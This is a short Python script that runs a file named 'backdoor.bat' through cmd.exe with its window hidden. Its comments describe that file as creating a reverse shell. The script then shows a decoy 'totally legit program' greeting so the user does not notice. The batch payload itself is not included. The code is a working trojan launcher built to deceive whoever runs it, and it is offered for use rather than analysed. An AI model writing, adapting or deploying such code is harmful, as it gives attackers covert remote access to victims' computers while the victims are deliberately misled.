#Importing the required modules
import subprocess
import os
import sys

# Get the directory where this Python file is located
current_dir = os.path.dirname(os.path.abspath(__file__))

# Build full path to the batch file assuming it's in a subdirectory (like 'b')
bat_file_path = os.path.join(current_dir, 'backdoor.bat')

#Path to the batch file to  create a reverse shell
#bat_file_path = r"backdoor.bat"

# Silently run the batch file (no CMD window)
def run_backdoor_silently():
    if os.path.exists(bat_file_path):
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

        subprocess.Popen(
            ["cmd.exe", "/c", bat_file_path],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        print("[+] Backdoor triggered silently.")
    else:
        print("❌ Backdoor batch file not found.")

# Normal user-facing logic to decept the user.
def main_ui():
    print("Welcome to this totally legit program 👀")
    name = input("Enter your name: ")
    print(f"Hello, {name}! 😁")
    input("Press Enter to exit...")

# Run the backdoor silently first
run_backdoor_silently()

# Then continue with the visible part
main_ui()
